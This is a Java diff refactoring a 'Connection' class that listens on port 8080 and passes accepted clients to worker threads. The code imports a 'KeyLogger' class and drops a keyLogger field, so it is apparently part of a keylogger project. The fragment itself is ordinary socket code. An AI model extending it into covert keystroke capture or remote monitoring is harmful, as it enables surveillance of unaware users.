@@ -5,33 +5,60 @@ import java.net.Socket;
 
 import KeyLogger.KeyLogger;
 
+import Protocols.state;
+
 public class Connection {
-	public static KeyLogger keyLogger = null;
-	private static ServerSocket server = null;
-	private static int port = 8080;
-	private static final int LINGER_TIME = 5000;	
-	public static void main(String[] arg) {
+	private ServerSocket server = null;
+	private Socket client = null;
+	private state ConnectionState;
+
+	private static final int PORT = 8080;
+	private static final int LINGER_TIME = 5000;
+
+	public Connection() {
+		this.server = null;
+		this.client = null;
+		this.ConnectionState = state.CLOSEED;
+	}
+
+	public String getClientAddress() {
+		if (this.ConnectionState == state.OPENED) {
+			return this.client.getInetAddress().toString();
+		}
+		return null;
+	}
+
+	public state getConnectionState() {
+		return this.ConnectionState;
+	}
+
+	public void activate() {
+		if (ConnectionState == state.OPENED)
+			return;
+
 		try {
-			System.out.println("Watting");
-			server = new ServerSocket(port);
-			
+			ConnectionState = state.OPENED;
+
+			server = new ServerSocket(PORT);
+
 			while (server.isBound() && server != null) {
-				Socket clientSocket = server.accept();
-				clientSocket.setSoLinger(true, LINGER_TIME);
-				System.out.println("connected by " + clientSocket.getInetAddress());
-				WorkerThread woker = new WorkerThread(clientSocket);
+				client = server.accept();
+				client.setSoLinger(true, LINGER_TIME);
+
+				WorkerThread woker = new WorkerThread(client);
 				woker.start();
 			}
 		} catch (Exception e) {
 			e.getStackTrace();
 		} finally {
 			try {
-				if(server != null) {
+				if (server != null) {
 					server.close();
 				}
 			} catch (Exception e2) {
 				e2.getStackTrace();
 			}
 		}
+
 	}
 }
